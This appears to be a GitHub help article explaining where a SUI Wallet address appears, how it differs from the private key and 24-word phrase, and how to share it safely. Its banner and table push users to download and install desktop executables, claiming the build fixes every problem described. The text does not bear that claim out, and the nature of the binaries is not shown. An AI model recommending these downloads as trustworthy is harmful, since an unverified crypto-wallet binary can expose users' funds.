![SUI Wallet](assets/banner-article.png)

# Finding your SUI Wallet address

The address is the account, and the app shows it in more than one place.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Your address is on the account, visible in the app beside a QR code and a copy button. It is public, it is
safe to share, and it is not the same thing as a private key: knowing the address lets someone send you
funds and nothing else. If a wallet holds several accounts, each one has its own address.

## Where the address appears

The address belongs to the selected account, so the first thing to check is which account is selected.
Switch accounts and the address changes with it - not because the wallet is confused, but because the two
addresses belong to two different accounts.

The account display, the receive screen and the send form all show the same address for the same account.
If two of them ever disagreed, that would be a fault worth reporting; in practice they are one value shown
in three places.

## One address per account

An account is an address plus the key behind it. Create a second account and you get a second address,
derived from the same phrase but different from the first - which is why a wallet with three accounts shows
three addresses and one balance figure at a time.

If two addresses appear where you expected one, the likely explanation is a second account rather than a
second address for the same account. The selector says which is which, and the balance follows the
selection.

Accounts can be told apart by what they are for rather than by their addresses, which is why naming one
after its purpose is worth the ten seconds it takes. An address is long, unmemorable and impossible to
check from memory at a glance; the label is what stops a send going to the wrong one.

## The QR and the copy button

The QR code encodes the selected account's address, which makes it the better option when the sender is beside you: they scan it and nothing gets mistyped on the way across. For everyone else there is the copy button beside it.

The copy button is for everyone else, and it is worth pasting the result somewhere you can see it before
sending it on. A copied address that goes straight into a chat is an address nobody has read, which matters
when the sender is about to send a balance to it.

## Address versus private key

These two are the pair that runs the account, and only one of them travels. The address is the public half:
it can be shared, printed, posted and handed over, and the worst that happens is somebody knows what the
account holds.

The private key - and the 24 words that encode it - is the half that signs. Nothing legitimate asks for it,
and anything that does is the scam this whole project keeps warning about. A private key is never typed
into a website, a chat or a form, and no support channel asks for one; the phrase is the readable form of
the same secret, which is why it gets the same treatment.
[Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers handing the address over, and
[How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) covers the other direction.

## Sharing it without risk

An address in a public place exposes history rather than funds: balances and past transfers are readable by
anyone who has it. That is a privacy question, and it has a practical answer - a second account, used for
the part of your activity you would rather not publish.

What sharing never does is give anyone the ability to move funds. That requires a signature, and a
signature requires the key.

One more thing an address does not prove: control. Anyone can paste any address into a page, so a site
asking for yours is collecting a public value, not verifying that you own it. Ownership is shown by a
signature, which is a separate request and a separate decision.

## Watching an address without holding it

An address can also be watched from somewhere that never holds the key: a read-only view in another tool,
or an explorer. That is useful for monitoring a balance from a machine that should not be able to spend it,
and it is why "sharing your address" and "sharing your wallet" are different sentences.

## FAQ

### Can someone steal my crypto with just my wallet address?

No. An address cannot sign anything. Theft needs the 24 words or an approval you gave, and an address gives
neither.

### How do I find my SUI Wallet address and QR code?

Open the account you want and read the address shown beside it; the QR code beside it encodes the same
value. The receive screen shows both in one place.

### Where is my address if I have several accounts?

Each account has its own. Select the account first, then copy - the address follows the selection, which
is why copying before checking the selector is how funds end up in the wrong account.

### Why are there two addresses for one account?

There are not. One account has one address; a second address on screen belongs to a second account. The
account selector shows which one is active.

### Is it safe to post my address publicly?

For the funds, yes. For your privacy, it publishes your history. Use a second account if that matters.

### Does my address change if I update the wallet?

No. The address is derived from the 24 words and does not depend on the release you are running. Install
the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest)
for the fixes, not for a new address.
